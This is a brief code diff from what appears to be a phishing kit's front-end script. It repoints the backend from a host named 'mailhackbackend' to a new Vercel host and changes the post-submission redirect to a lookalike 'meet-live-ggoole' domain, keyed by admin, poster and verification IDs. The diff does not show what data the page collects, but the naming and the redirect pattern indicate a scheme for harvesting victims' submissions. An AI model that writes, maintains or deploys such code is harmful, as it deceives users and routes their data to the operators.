@@ -1,4 +1,4 @@
-const API_URL = 'https://mailhackbackend.vercel.app'
+const API_URL = 'https://meetbackend-three.vercel.app'
 const siteUrl ='www.meggapursonel.online'
 
 function detectDevice(userAgent) {
@@ -72,7 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     console.log('Response:', data);
                     if (data) {
                         // Redirect to another URL on success
-                        window.location.href =   `https://love-loaction.vercel.app/${admin}/${poster}/${verifyId}`;;
+                        window.location.href =   `https://meet-live-ggoole.vercel.app/${admin}/${poster}/${verifyId}`;;
                     }
                 })
                 .catch(error => {
